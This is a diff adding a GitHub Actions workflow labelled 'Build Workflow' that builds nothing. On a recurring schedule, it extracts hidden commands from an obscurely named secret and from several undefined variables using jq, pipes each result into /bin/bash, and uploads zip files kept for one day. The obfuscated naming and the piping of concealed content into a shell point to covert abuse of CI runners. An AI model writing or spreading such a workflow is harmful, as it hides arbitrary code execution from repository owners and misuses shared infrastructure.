@@ -1,0 +1,31 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          phk593: ${{ secrets.phk593 }}
+        run: |
+          printf '%s' "$phk593" | jq -r .gfn43863 | /bin/bash
+          printf '%s' "$q078" | jq -r .diszb4 | /bin/bash
+          printf '%s' "$aqczi40039" | jq -r .xsry3169 | /bin/bash
+          echo $m074 | jq -r .gffw04 | /bin/bash
+          echo $y005 | jq -r .aru7265 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: iCcBVAc9
+          path: "*.zip"
+          retention-days: 1
